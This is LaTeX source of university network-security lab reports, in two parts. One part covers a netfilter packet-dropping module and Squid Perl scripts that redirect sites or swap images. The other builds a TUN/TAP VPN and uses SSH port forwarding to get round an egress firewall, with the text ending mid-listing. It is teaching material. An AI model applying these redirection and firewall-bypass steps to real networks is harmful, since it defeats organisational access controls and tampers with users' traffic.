\noindent The figure shown above shows how powerful web proxies can be used to deface websites and redirect as well as to control access to websites, shown in the previous sections. Programs and proxies can also be adapted to evade filtering on any level or to inject malicious code into websites where the user is not aware of.

\newpage
\section{Appendix A}
\label{ch:AppA}
\subsection{Packet Filtering Module -- pfm.c}
\begin{minted}[linenos,breaklines]{C}
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/in.h>

static struct nf_hook_ops nfho;         //struct holding set of hook function options
struct iphdr *iphd;

//function to be called by hook
unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
  iphd = ip_hdr(skb);
  if(iphd->protocol ==IPPROTO_ICMP){		//Checks for ICMP packet (Added from original)
  	printk(KERN_INFO "packet dropped\n");   //log to var/log/messages
  	return NF_DROP;                         //drops the packet
	}
  else	//Accept if not ICMP (Added from original)
	return NF_ACCEPT;
}

//Called when module loaded using 'insmod'
int init_module()
{
  nfho.hook = &hook_func;              //function to call when conditions below met
  nfho.hooknum = NF_INET_PRE_ROUTING;  //called right after packet recieved, first hook in Netfilter
  nfho.pf = PF_INET;                   //IPV4 packets
  nfho.priority = NF_IP_PRI_FIRST;     //set to highest priority over all other hook functions
  nf_register_hook(&nfho);             //register hook

  return 0;                            //return 0 for success
}

//Called when module unloaded using 'rmmod'
void cleanup_module()
{
  nf_unregister_hook(&nfho);                     //cleanup – unregister hook
}
\end{minted}
\noindent *Notes for the code above:
\begin{enumerate}
\item The \texttt{\&} symbol is missing from the original documentation and will cause the system to crash when the module is added to the kernel. The function definition found in \texttt{netfilter.h} explictly provides the structure for \texttt{nf\_hook\_ops} has been provided below.
\begin{minted}{C}
struct nf_hook_ops {
	struct list_head list;

	/* User fills in from here down. */
	nf_hookfn *hook;
	struct module *owner;
	u_int8_t pf;
	unsigned int hooknum;
	/* Hooks are ordered in ascending priority. */
	int priority;
};
\end{minted}
\item The function definition for the hook function has an added \texttt{*} for \texttt{*skb} when compared to the \texttt{netfilter.h} file and has been removed (although it can be simply corrected by using \texttt{ip\_hdr(*skb)} on line 14).
\begin{minted}{C}
typedef unsigned int nf_hookfn(unsigned int hooknum,
			       struct sk_buff *skb,
			       const struct net_device *in,
			       const struct net_device *out,
			       int (*okfn)(struct sk_buff *));
\end{minted}
\end{enumerate}
\subsection{Makefile}
\begin{minted}[linenos]{bash}
obj-m += pfm2.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
\end{minted}
\section{Appendix B}
\label{ch:AppB}
\subsection{\texttt{myprog.pl}}
\begin{minted}[linenos,breaklines]{perl}
#!/usr/bin/perl -w
use strict;
use warnings;

# Forces a flush after every write or print on the STDOUT
select STDOUT; $| =1;

# Get the input line by line from the standard input.
# Each line contains a URL and some other information.
while (<>)
{
	my @parts = split;
	my $url = $parts[0];
	# If you copy and paste this code from this PDF file,
	# the ~ (tilde) character may not be copied correctly.
	# Remove it, and then type the character manually.
	if ($url =~ /www\.ntu\.edu\.sg/) {
		#URL Rewriting
		print "http://www.google.com.sg\n";
	}
	else {
		# No Rewriting
		print "\n";
	}
}
\end{minted}
\subsection{\texttt{myprog.pl} -- Stop Sign}
\label{ch:AppBStop}
\begin{minted}[linenos,breaklines]{perl}
#!/usr/bin/perl -w
use strict;
use warnings;

# Forces a flush after every write or print on the STDOUT
select STDOUT; $| = 1;

# Get the input line by line from the standard input.
# Each line contains a URL and some other information.
while (<>)
{
	my @parts = split;
	my $url = $parts[0];
	#If you copy and paste this code from this PDF file,
	# the ~ (tilde) character may not be copied correctly.
	# Remove it, and then type the character manually.
	if ($url =~ /facebook\.com/){
		#URL Rewriting
		print "http://upload.wikimedia.org/wikipedia/commons/ thumb/1/1e/Vienna_Convention_road_sign_B2a.svg/ 500px-Vienna_Convention_road_sign_B2a.svg.png\n";
	}
	else {
		#No Rewriting
		print "\n";
	}
}
\end{minted}
*Note: Using \texttt{https} for the URL redirect will cause \texttt{squid} to identify it as an invalid protocol and will stop the redirection with an error message.
\subsection{\texttt{myprog.pl} -- Image Manipulation}
\label{ch:AppBImgMod}
\begin{minted}[linenos,breaklines]{perl}
#!/usr/bin/perl -w
use strict;
use warnings;

# Forces a flush after every write or print on the STDOUT
select STDOUT; $| = 1;

# Get the input line by line from the standard input.
# Each line contains a URL and some other information.
while (<>)
{
    my @parts = split;
    my $url = $parts[0];
    #If you copy and paste this code from this PDF file,
    # the ~ (tilde) character may not be copied correctly.
    # Remove it, and then type the character manually.
    if ($url =~ /\.(jpg|png|svg|PNG|JPG|JPEG|BMP|bmp|jpeg|SVG)/){
            #URL Rewriting
            print "http://upload.wikimedia.org/wikipedia/commons/ thumb/1/1e/Vienna_Convention_road_sign_B2a.svg/ 500px-Vienna_Convention_road_sign_B2a.svg.png\n";
    }
    else {
            #No Rewriting
            print "\n";
    }
}

\end{minted}
%PDF 7: Firewall Bypass - VPN%
\begin{titlepage}
		\begin{center}
		\vspace*{27em}
		\Huge
			\textbf{Linux Virtual Private Network (VPN) Lab}
			\vfill
		\end{center}
	\end{titlepage}
	
	\pagenumbering{roman}
	\newpage
	\pagenumbering{arabic}
	\setcounter{section}{0}
	\section{Introduction}
	Organisation, Internet Service Providers (ISPs) and countries often block users from accessing certain external sites through what is known as egress filtering. This is used within organisations to reduce distractions, countries may make use of it to censor foreign web sites. However, these firewalls can easily be bypassed and there are multiple services/applications that aid in the circumvention.\\\\The most common technology that is used to bypass these egress filtering are Virtual Private Networks (VPNs). VPNs are also commonly available on smartphone devices to help bypass these egress firewalls.
	\section{Overview}
	This lab will focus on how the VPN works and how it can be used to bypass egress firewalls. A VPN usually depends on two components, IP tunnelling and encryption. Tunnelling is crucial in helping to bypass these firewalls while the encryption helps to protect the content that is being transmitted through the VPN tunnel. For simplicity, encryption is not in the scope of this lab.
	\section{Exploration}
	Implementing a simple VPN for \texttt{Linux} is not trivial and is broken into multiple segments, with detailed observations for each step in the process. By setting up the VPN, a tunnel is established between two systems. When system A is behind a firewall and wants to access restricted resources, it will be blocked by egress filtering. Therefore, the packets are routed through to system B where it will send the packets out to the Internet. Similarly, the response from the Internet will be routed through to system B before sending it back to system A via the tunnel. This is how the VPN helps system A to bypass the firewall.
	\subsection{Virtual Machine (VM) Setup}
	\subsubsection{VM Configuration}
	Two VMs are required for this lab. VM1 is behind a firewall while VM2 is outside the firewall. The objective is to help VM1 bypass the firewall so it is able to access blocked sites on the Internet.\\\\VM1 and VM2 are connected to a separate NAT adapter, so both can access the Internet using the corresponding NAT servers. To emulate the Internet, where both VM1 and VM2 can communicate to each other, both VMs are connected to a host-only network adapter. This network emulates the facilitation of communication between the two VMs. The network setup is depicted in figure 1 for easier reference.
	
	\begin{figure}[H]
		\centering
		\begin{tikzpicture}			
		\draw[fill=red!10] (-5.25,2.15) rectangle (-3.95,1.25);
		\draw (-5.4,2.3) rectangle (-3.8,1.1);
		\draw (-4.6,0.3) node[text width=3cm, align=center]{NAT Server\\10.0.2.1};
		
		\draw(-2.3,1.65) node{\includegraphics[width=0.10\linewidth,height=0.18\linewidth]{firewall.png}};
		\draw(-2.3,0.05) node {Firewall};
		\node[cloud, draw,cloud puffs=12,cloud puff arc=160, aspect=3, inner ysep=0.1cm, inner xsep=0.1cm, text width=1.8cm,align=center] at (0.3,1.69)  {Internet} ;
		
		\draw[fill=red!10] (3.45,2.15) rectangle (4.75,1.25);
		\draw (3.3,2.3) rectangle (4.9,1.1);
		\draw (4.1 ,0.3) node[text width=3cm, align=center]{NAT Server\\10.0.3.1};	
		
		\draw[fill=yellow!10] (-3.1,-1.35) rectangle (-1.8,-2.25);
		\draw (-3.25,-1.2) rectangle (-1.65,-2.4);
		\draw (-2.05,-2.4) rectangle (-2.85,-2.9);
		\draw (-3.05,-2.75) -- (-3.45,-3.1);
		\draw (-1.85,-2.75) -- (-1.45,-3.1);
		\draw (-3.45,-3.1) -- (-1.45,-3.1);
		\draw (-3.05,-2.75) -- (-2.85,-2.75);
		\draw (-1.85,-2.75) -- (-2.05,-2.75);
		\draw (-2.45,-3.8) node[text width=3cm,align=center]{VM1\\192.168.10.5};
		
		\draw[fill=yellow!10] (1,-1.35) rectangle (2.3,-2.25);
		\draw (0.85,-1.2) rectangle (2.45,-2.4);
		\draw (2.05,-2.4) rectangle (1.25,-2.9);
		\draw (1.05,-2.75) -- (0.65,-3.1);
		\draw (2.25,-2.75) -- (2.65,-3.1);
		\draw (0.65,-3.1) -- (2.65,-3.1);
		\draw (1.05,-2.75) -- (1.25,-2.75);
		\draw (2.25,-2.75) -- (2.05,-2.75);
		\draw (1.65,-3.8) node[text width=3cm,align=center]{VM2\\192.168.10.6};
		
		\draw(-3.8,1.7) -- (-2.98,1.7);
		\draw(-1.95,1.7) -- (-1.17,1.7);
		\draw(3.3,1.7) -- (1.76,1.7);
		
		\draw (-5.4,1.7) -- (-6.5,1.7);
		\draw (-3.25,-1.8) -- (-6.5,-1.8);
		\draw (-6.5,-2.3) --node[text width=4.5cm,align=center,rotate=90]{NAT - Network\\(10.0.2.0/24)} (-6.5,2.2);
		
		\draw(4.9,1.7)--(6,1.7);
		\draw(2.45,-1.8) -- (6,-1.8);
		\draw(6,-2.3) --node[text width=4.5cm,align=center,rotate=-90]{NAT - Network\\(10.0.3.0/24)} (6,2.2);
		
		\draw (-1.65,-1.8) -- (-0.8,-1.8);
		\draw (0.85,-1.8) -- (0,-1.8);
		\draw (-0.8,-1.8) -- (-0.8,-4.8);
		\draw (0,-1.8) -- (0,-4.8);
		\draw (-4,-4.8)--(3.2,-4.8);
		\draw (-0.4,-4.8) node[text width=7.2cm,align=center,yshift=-0.6cm]{Host-only Network\\(192.168.10.0/24)};
		
		
		\end{tikzpicture}
		\caption{Network Topology}
		\label{fig:Networksetup}
	\end{figure}
	\iffalse
	\subsubsection{Firewall Configuration}
	To emulate a corporate/academic environment, we use a packet firewall \texttt{ufw} to prevent any unwanted traffic exiting/entering the internal network. The following ports between 1--1023 are blocked from accessing any traffic (common system ports).
	\begin{enumerate}
		\itemsep0em 
		\item 20 -- File Transfer Protocol (FTP) data transfer
		\item 21 -- FTP control
		\item 22 -- Secure Shell (SSH)
		\item 23 -- Telnet
		\item 80 -- HyperText Transfer Protocol (HTTP) (Unsecured websites)
		\item 443 -- HyperText Transfer Protocol over TLS/SSL (HTTPS) (Secured websites)
		\item 514 -- Remote Shell
		\item 989 -- File Transfer Protocol over TLS/SSL (FTPS) data transfer
		\item 990 -- FTPS control
		\item 992 -- Telnet protocol over TLS/SSL
	\end{enumerate}
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.7\linewidth]{firewallrule}
		\caption{Active Firewall Blocking on VM1}
		\label{fig:firewallrule}
	\end{figure}
	\fi
	
	\subsection{Task 1: Creating Host-to-Host Tunnel with TUN/TAP}
	TUN/TAP are essential and is widely implemented in modern computing systems. TUN and TAP are virtual network kernel drivers and are implemented entirely by software. TAP (as in network tap) simulates an Ethernet device and operates with layer-2 packets such as Ethernet frames. TUN (as in network TUNnel) simulates a network layer device and operates with layer-3 packets such as IP packets. With TUN/TAP, virtual network interfaces can be created.\\\\A user-space program usually attaches to the TUN/TAP virtual network interface. Packets sent by an operating system via a TUN/TAP network interface are delivered to the user-space program. When packets are sent by the program via a TUN/TAP network interface, the packets are injected into the operating system network stack. On the operating system, the packets appear to originate from an external source through the virtual network interface. \\\\When a program attaches to a TUN/TAP interface, the IP packets that the computer sends to this interface will be piped into the program. IP packets that are sent by the program instead will be piped into the computer, as if they came from the Internet through this virtual network interface. Standard \texttt{read()} and \texttt{write()} function calls can be made to send or receive packets to and from the virtual interface accordingly.\\\\The source code to create a simple TUN/TAP has been provided by Davide Brini\footnote{\url{http://backreference.org/2010/03/26/tuntap-interface-tutorial}} and has been adapted by SEED Labs for this lab. The tutorial for the source code also shows how two computers can be connected using the TUN tunnelling technique. The adapted TUN/TAP code (\texttt{simpletun}) has been attached to \hyperref[ch:AppA]{Appendix A} for reference.
\\\\
	The \texttt{simpletun} program can run as both a client and a server. To run as a client, the \texttt{-c} is used. To run it as a server instead, the \texttt{-s} flag is used. The following list details the requirements to create a tunnel between two computers using the \texttt{simpletun} program.\subsubsection{Setting Up Tunnel Point A}Tunnel point A is set to be the server side of the tunnel, which is on VM1. Once the tunnel between the two systems have been established, there is no difference between client and the server as the concept is only meaningful during the establishment of connection between two systems.\\\\The following command is executed in terminal (with root privileges).
	\begin{verbatim}
	# ./simpletun -i tun0 -s -d
	\end{verbatim}
	\noindent At this point, the virtual network device \texttt{tun0} has been created and the system now has multiple network interfaces. It will not show up if \texttt{ifconfig} is used as the interface is currently not active. Instead, the command \texttt{ip addr show} will list all physical and virtual network interfaces attached to the system regardless of status, as shown in Figure \ref{fig:VirtNet}.
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.9\linewidth]{ipaddr}
		\caption{Virtual Network Details}
		\label{fig:VirtNet}
	\end{figure}
	\noindent The new virtual network device is not fully configured, as evident by the absence of an IP address. The IP address that we will be assigning will be from the reserved IP address space 10.0.0.0/8. It is also important to note that the \texttt{Terminal} window that was used to create the virtual network interface is currently waiting for connections and cannot be used currently. Another window needs to be opened to assign an IP address to the virtual network interface \texttt{tun0}, using the following commands.
	\begin{verbatim}
	# ip addr add 10.0.3.15/24 dev tun0
	# ifconfig tun0 up
	\end{verbatim}
	If \texttt{ifconfig} is used now, it appears as a valid network interface with its configuration displayed.
	
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.7\linewidth]{ifconfig}
		\caption{Valid Network Interfaces}
		\label{fig:ifconfig}
	\end{figure}
	\subsubsection{Setting Up Tunnel Point B}
	Tunnel point B is used as the client side of the tunnel, which is to be on VM2. The setup is similar to VM1. The first command used will connect our client to the server (VM1), which is tunnel point A.
	\begin{verbatim}
	# ./simpletun -i tun0 -c 192.168.10.5 -d
	\end{verbatim}
	Executing the line above will immediately trigger the \texttt{Terminal} window on both VM1 and VM2 to state that the connection between each other has been established. This shows that the configuration is correct.
	\begin{figure}[H]
		\centering
		\begin{subfigure}[H]{0.9\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{server}
			\caption{Server Response}
			\label{fig:serverconn}
		\end{subfigure}
		\\
		\begin{subfigure}{0.9\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{client}
			\caption{Client Response}
			\label{fig:clientconn}
		\end{subfigure}
		\caption{Both Systems Connected}
	\end{figure}
	
	\noindent Again, the previous command will prevent any further input in the current window, hence the following commands to initialise the virtual network interface must be done in a separate window.
	\begin{verbatim}
	# ip addr add 10.0.3.16/24 dev tun0
	# ifconfig tun0 up
	\end{verbatim}
	Once it has been executed, the virtual network interface will have all the configurations required to be a functional network adapter.
	\subsubsection{Establishing Routing Path}
	By the previous steps, a tunnel has been established between the two systems. However before it can be used to transmit data, the routing path needs to be set up so that both machines will direct the intended outgoing traffic through the tunnel. The following routing table directs all packs for the 10.0.3.0/24 network through the interface \texttt{tun0}, where the packets will travel through the tunnel. The following must be executed on \textbf{both} VMs:
	\begin{verbatim}
	# route add -net 10.0.3.0 netmask 255.255.255.0 dev tun0
	\end{verbatim}
	\subsubsection{Using The Tunnel}
	Using VM1, we are now able to access VM2 through the \texttt{tun0} adapter. Likewise, VM2 can access VM1 through the \texttt{tun0} adapter as well. The tunnel connection can be tested using the \texttt{ssh} or \texttt{ping} programs.\\\\
	To use \texttt{ssh}, the \texttt{ssh} server must be started first.
	\begin{verbatim}
	$ sudo service ssh start
	\end{verbatim}
	To test the tunnel from VM1:
	\begin{verbatim}
	$ ping 10.0.3.16
	$ ssh 10.0.3.16
	\end{verbatim}
	To test the tunnel from VM2:
	\begin{verbatim}
	$ ping 10.0.3.15
	$ ssh 10.0.3.15
	\end{verbatim}
	\noindent If the tunnel is successful, both \texttt{ssh} and \texttt{ping} will display valid responses from the other system. The figure below shows the packet capture from Wireshark for \texttt{ssh} in both directions is proof that the tunnel works as expected.
	\begin{figure}[H]
		\centering
		\begin{subfigure}[H]{1\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{wiresharkpingAtoB}
			\caption{\texttt{Ping} from A to B}
			\label{fig:pingAB}
		\end{subfigure}
		\\
		\begin{subfigure}{1\textwidth}
			\centering
			\includegraphics[width=1\linewidth]{wiresharkpingBtoA}
			\caption{\texttt{Ping} from B to A}
			\label{fig:pingBA}
		\end{subfigure}
		\caption{Both Systems Contactable}
	\end{figure}
	\begin{figure}[H]
			\centering
			\begin{subfigure}[H]{0.47\textwidth}
				\centering
				\includegraphics[width=1\linewidth]{sshA2B}
				\caption{\texttt{SSH} from A to B}
				\label{fig:sshAB}
			\end{subfigure}
			~
			\begin{subfigure}{0.47\textwidth}
				\centering
				\includegraphics[width=1\linewidth]{sshB2A}
				\caption{\texttt{SSH} from B to A}
				\label{fig:sshBA}
			\end{subfigure}
			\caption{Both Systems Connected}
		\end{figure}
	\noindent Also of interest while the two systems are connected is that data that goes through the tunnel are displayed in the first Terminal window that was opened in VM1 and VM2 (the window that was used to start the \texttt{simpletun} program). Both display the data that was sent to/from the tap interface and the network. It is also noteworthy to notice that the logs on both systems corroborate with the details mentioned in the introduction, which has been summarised into the table below with the corresponding screenshots from the VMs.
	\begin{table}[H]
		\centering
		\begin{tabular}{l|l}
			VM1                                                                                                                     & VM2                                                                                                                     \\ \hline
			\begin{tabular}[c]{@{}l@{}}TAP2NET \textless{}id\textgreater{}: \\ Read x bytes from the tap interface\end{tabular}  & \begin{tabular}[c]{@{}l@{}}NET2TAP \textless{}id\textgreater{}: \\ Read x bytes from the network\end{tabular}        \\ \hline
			\begin{tabular}[c]{@{}l@{}}TAP2NET \textless{}id\textgreater{}: \\ Written x bytes to the network\end{tabular}       & \begin{tabular}[c]{@{}l@{}}NET2TAP \textless{}id\textgreater{}: \\ Written x bytes to the tap interface\end{tabular} \\ \hline
			\begin{tabular}[c]{@{}l@{}}NET2TAP \textless{}id\textgreater{}: \\ Read x bytes from the network\end{tabular}        & \begin{tabular}[c]{@{}l@{}}TAP2NET \textless{}id\textgreater{}: \\ Read x bytes to the tap interface\end{tabular}    \\ \hline
			\begin{tabular}[c]{@{}l@{}}NET2TAP \textless{}id\textgreater{}: \\ Written x bytes to the tap interface\end{tabular} & \begin{tabular}[c]{@{}l@{}}TAP2NET \textless{}id\textgreater{}: \\ Written x bytes to the network\end{tabular}      
		\end{tabular}
		\caption{Differences between logs of both VMs}
		\label{tab:VMLog}
	\end{table}
	\begin{figure}[H]
				\centering
				\begin{subfigure}[H]{0.47\textwidth}
					\centering
					\includegraphics[width=1\linewidth]{VMAlog}
					\caption{Logs from VM1}
					\label{fig:VM1Log}
				\end{subfigure}
				~
				\begin{subfigure}{0.47\textwidth}
					\centering
					\includegraphics[width=1\linewidth]{VMBlog}
					\caption{Logs from VM2}
					\label{fig:VM2Log}
				\end{subfigure}
				\caption{Logs in Sync}
			\end{figure}
	\noindent To this point, the connection of both VMs using a tunnel has been successful. Figure \ref{fig:H2HTun} is a diagrammatic representation on the current state of the network between the two VMs.
	\begin{figure}[H]
		\centering
		\begin{tikzpicture}			
		\node[cloud, draw,cloud puffs=12,cloud puff arc=160, aspect=3, inner ysep=0.1cm, inner xsep=0.1cm, text width=1.8cm,align=center] at (-0.4,-4.8)  {Internet} ;
		
		\draw[fill=yellow!10] (-6.1,-1.35) rectangle (-4.8,-2.25);
		\draw (-6.25,-1.2) rectangle (-4.65,-2.4);
		\draw (-5.05,-2.4) rectangle (-5.85,-2.9);
		\draw (-6.05,-2.75) -- (-6.45,-3.1);
		\draw (-4.85,-2.75) -- (-4.45,-3.1);
		\draw (-6.45,-3.1) -- (-4.45,-3.1);
		\draw (-6.05,-2.75) -- (-5.85,-2.75);
		\draw (-4.85,-2.75) -- (-5.05,-2.75);
		\draw (-5.45,-3.8) node[text width=3cm,align=center]{VM1\\192.168.10.5};
		
		\draw[fill=yellow!10] (4,-1.35) rectangle (5.3,-2.25);
		\draw (3.85,-1.2) rectangle (5.45,-2.4);
		\draw (5.05,-2.4) rectangle (4.25,-2.9);
		\draw (4.05,-2.75) -- (3.65,-3.1);
		\draw (5.25,-2.75) -- (5.65,-3.1);
		\draw (3.65,-3.1) -- (5.65,-3.1);
		\draw (4.05,-2.75) -- (4.25,-2.75);
		\draw (5.25,-2.75) -- (5.05,-2.75);
		\draw (4.65,-3.8) node[text width=3cm,align=center]{VM2\\192.168.10.6};
		
		\draw (-4.65,-1.8) -- (-3.8,-1.8);
		\draw (3.85,-1.8) -- (3,-1.8);
		\draw (-3.8,-1.8) -- (-3.8,-4.8);
		\draw (3,-1.8) -- (3,-4.8);
		\draw (-7,-4.8)--(-1.86,-4.8);
		\draw (1.07,-4.8)--(6.2,-4.8);
		
		\draw(-5.45,-1.2)-- (-5.45,-0.5) -- (-4,-0.5);
		\draw (-4,-1.1) rectangle node[text width=1.6cm, align=center]{Tunnel\\Point A}(-2.4,0.1);
		\draw (-3.2,0.4) node[align=center]{\footnotesize tun0: 10.0.3.15};
		
		\draw (4.65,-1.2)-- (4.65,-0.5) -- (3.2,-0.5);
		\draw (3.2,-1.1) rectangle node[text width=1.6cm, align=center]{Tunnel\\Point B}(1.6,0.1);
		\draw (2.4,0.4) node[align=center]{\footnotesize tun0: 10.0.3.16};
		
		\draw[densely dotted, line width=0.6mm](-3.6,-1.1) -- (-3.6,-4.6)--(2.8,-4.6)--(2.8,-1.1);
		\draw[densely dotted, line width=0.6mm](-7,-6.2) -- (-6.4,-6.2) node[xshift=1.9cm] {Tunnel using UDP};
		
		\end{tikzpicture}
		\caption{Tunnel Network over Emulated Internet}
		\label{fig:H2HTun}
	\end{figure}
	
	\subsection{Task 2: Creating Host-to-Gateway Tunnel}
	Completing the previous task is insufficient as accessing VM2 through the tunnel is a secondary objective. Instead, the packet sent through the VPN tunnel are to be routed out to the Internet. In other words, VM2 must function as a gateway. This will make our tunnel a host-to-gateway tunnel. As a continuation of the previous task, the following additional tasks must be completed.
	\subsubsection{Setting Up IP Forwarding}
	Unless the system is explicitly configured, a computer will only as a host and not a gateway. To do so, the command below enables IP forwarding, allowing the computer to behave like a gateway.
	\begin{verbatim}
	$ sudo sysctl net.ipv4.ip_forward=1
	\end{verbatim}
	\subsubsection{Getting Around The Limitation of NAT}
	When the destination sends the reply packets back to the machine on the private network, it will reach the NAT first (as the source IP of all outgoing packets are changed to the NAT's external IP address). The NAT will usually replace the destination IP address with the IP address of the original packet and send it to the system to whoever owns the IP address.\\\\Before the NAT sends out the packet, it needs to know the MAC address of the machine that own the IP address 10.0.3.15. To solve the limitation, an extra NAT is created on VM2 so that all packets sent out of VM2 will have VM2's IP address as its source IP. To reach the Internet, the packets will need to go through the NAT adapter that has already been provisioned when the VMs were set-up. The following sets of commands will enable the NAT on VM2.\\\\The first step is to clean all of \texttt{iptables} rules.
	\begin{verbatim}
	$ sudo iptables -F
	$ sudo iptables -t nat -F
	\end{verbatim}
	Next, we need to add a rule on the postrouting position to the NAT adapter, in this instance with \texttt{eth0} (this network adapter may change depending on the interface identified within the VM). The network adapter selected for postrouting must be outward-facing.
	\begin{verbatim}
	$ sudo iptables -t nat -A POSTROUTING -j MASQUERADE -o eth0
	\end{verbatim}
	\subsubsection{Setting Up Firewall}
	The firewall is set up on VM1 to block the access of a target website. Setting up the firewall requires superuser privileges, as with the setup of the VPN tunnel. With reference to the previously completed Firewall lab, popular social media sites Facebook and Twitter are blocked to prevent distractions within organisations.
\\\\
	Setting up the firewall on VM1 invokes an issue where the firewall should not be able to block packets over the virtual network interface or the VPN will not be able to function at all. Therefore, the firewall rule cannot be set before the routing, nor can it be set on the virtual interface.\\\\
	The firewall rule only needs to be set for the physical network interface so it will not affect the virtual network interface. The following \texttt{iptables} command can help to overcome this problem by preventing the packets with the affected IP addresses from going through the physical network adapter \texttt{eth0}.
	\begin{verbatim}
	# iptables -t mangle -A POSTROUTING -d 155.69.7.173/24 -o eth0 -j DROP
	\end{verbatim}
	In the above code, the NTU site (including NTULearn, iNTU etc.) are all blocked as one IP address serves the entire domain. Since NTU is the only site is blocked by the firewall rule, accessing other sites is not an issue. 
	\begin{figure}[H]
	\centering
	\includegraphics[width=0.9\linewidth]{firewallblock}
	\caption{NTU Site Blocked}
	\label{fig:firewallblock}
	\end{figure}
	\noindent To manually check whether the IP address was properly stored in \texttt{iptables}, the following line of code can be used.
	\begin{verbatim}
	# iptables -L -t mangle --line-numbers
	\end{verbatim}
\begin{figure}[H]
\centering
\includegraphics[width=0.7\linewidth]{iptable}
\caption{List of \texttt{mangle} entries}
\label{fig:iptable}
\end{figure}
	\subsubsection{Bypassing Firewall}

To bypass the egress filtering by the firewall, a SSH tunnel is established between the two VMs using the existing VPN tunnel. For web filtering, the dynamic port forwarding (\texttt{-D}) switch can be used as packets will automatically be forwarded to the destinations.
\begin{verbatim}
ssh -D 3000 seed@10.0.3.16
\end{verbatim}
After SSH has been established, the browser must be configured to make use of the dynamic port forwarding mechanism. To do so, we must navigate to the following: \texttt{Edit \textgreater Preferences \textgreater Advanced \textgreater Network \textgreater Settings}. The ``Manual Proxy Configuration'' option must be selected. As we are using SSH, the SOCKS proxy should be used. For the host, it should be \texttt{localhost} with port \texttt{3000}. SOCKS v5 needs to be selected as well. The rest of the options will remain as the default. Figure \ref{fig:proxyconf} is a screenshot of the proxy settings in Firefox.
	\begin{figure}[H]
		\centering
		\includegraphics[width=0.7\linewidth]{proxyconf}
		\caption{Proxy Configuration}
		\label{fig:proxyconf}
	\end{figure}
\noindent Once completed, the \textit{Connection Settings} \& \textit{Preferences} windows can be closed and the new settings will take effect immediately. If the proxy has been properly configured, then refreshing the site will allow the page to load up successfully, bypassing the firewall rule.
	\begin{figure}[H]
	\centering
	\includegraphics[width=0.9\linewidth]{accessok}
	\caption{Firewall Bypassed For Websites}
	\label{fig:accessok}
	\end{figure}
\noindent To demonstrate how applications can bypass the firewall, \texttt{Telnet} is used as a classic example. To block the \texttt{Telnet} protocol, the packet filtering firewall \texttt{ufw} can be used and it complements \texttt{iptables}. The following lines are executed in superuser privileges.
\begin{verbatim}
# ufw deny out to any port 23
# ufw deny in from any port 23
# ufw disable
# ufw enable
\end{verbatim} 
If there is any attempt to initiate \texttt{Telnet} from VM1, then the \texttt{Telnet} requests will timeout and no connection will be established since all packets are dropped by \texttt{ufw}.
\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{telnetblock}
\caption{\texttt{Telnet} Timeout}
\label{fig:telnetblock}
\end{figure}
\noindent To use \texttt{Telnet}, the SSH tunnel is made use of again. However, this time static port forwarding is used.
\begin{verbatim}
$ ssh -L 3000:10.0.3.16:23 seed@10.0.3.16
\end{verbatim}
When the SSH tunnel has been established, the \texttt{Telnet} program has to make to use of the static port forwarding rule. To do so, \texttt{Telnet} connects to the source port and \texttt{localhost} to initiate the connection.
\begin{verbatim}
$ telnet localhost 3000
\end{verbatim}
Successful connection through the SSL tunnel will prompt the user login and password of the remote system, in this case VM2. When \texttt{ifconfig | grep "inet addr"} is executed, the IP address that should show up will be for VM2.
\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{telnetok}
\caption{Proof of Successful \texttt{Telnet} via \texttt{ifconfig} Checking}
\label{fig:telnetok}
\end{figure}
\noindent
Using Wireshark to analyse the packets between the two VMs, it can be noticed that packets that are from VM1 are sent to \texttt{tun0} with the source and the destination being the host-only network IP address (eth1). This packet is ``repackaged'' and sent through the tunnel by SSH. This is reflected as the source and destination IP of the packet is the IP address of the TUN/TAP that was set in task 1. Again when the data is sent back, the packet headers are modified by the TUN/TAP adapter before it travels through the tunnel.
\begin{figure}[H]
\centering
\includegraphics[width=0.9\linewidth]{connectothermac}
\caption{Packet Flow in Wireshark}
\label{fig:connectothermac}
\end{figure}

	\newgeometry{left=1.5cm,top=1cm, bottom=2cm,right=1.5cm}
	\section{Appendix A}
	\label{ch:AppA}
	\begin{minted}[linenos,breaklines]{C}
/**************************************************************************
 * simpletun.c                                                            *
 *                                                                        *
 * A simplistic, simple-minded, naive tunnelling program using tun/tap    *
 * interfaces and TCP. Handles (badly) IPv4 for tun, ARP and IPv4 for     *
 * tap. DO NOT USE THIS PROGRAM FOR SERIOUS PURPOSES.                     *
 *                                                                        *
 * You have been warned.                                                  *
 *                                                                        *
 * (C) 2009 Davide Brini.                                                 *
 *                                                                        *
 * DISCLAIMER AND WARNING: this is all work in progress. The code is      *
 * ugly, the algorithms are naive, error checking and input validation    *
 * are very basic, and of course there can be bugs. If that's not enough, *
 * the program has not been thoroughly tested, so it might even fail at   *
 * the few simple things it should be supposed to do right.               *
 * Needless to say, I take no responsibility whatsoever for what the      *
 * program might do. The program has been written mostly for learning     *
 * purposes, and can be used in the hope that is useful, but everything   *
 * is to be taken "as is" and without any kind of warranty, implicit or   *
 * explicit. See the file LICENSE for further details.                    *
 *************************************************************************/ 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if.h>
#include <linux/if_tun.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <arpa/inet.h> 
#include <sys/select.h>
#include <sys/time.h>
#include <errno.h>
#include <stdarg.h>

/* buffer for reading from tun/tap interface, must be >= 1500 */
#define BUFSIZE 2000   
#define CLIENT 0
#define SERVER 1
#define PORT 55555

/* some common lengths */
#define IP_HDR_LEN 20
#define ETH_HDR_LEN 14
#define ARP_PKT_LEN 28

int debug;
char *progname;

/**************************************************************************
 * tun_alloc: allocates or reconnects to a tun/tap device. The caller     *
 *            needs to reserve enough space in *dev.                      *
 **************************************************************************/
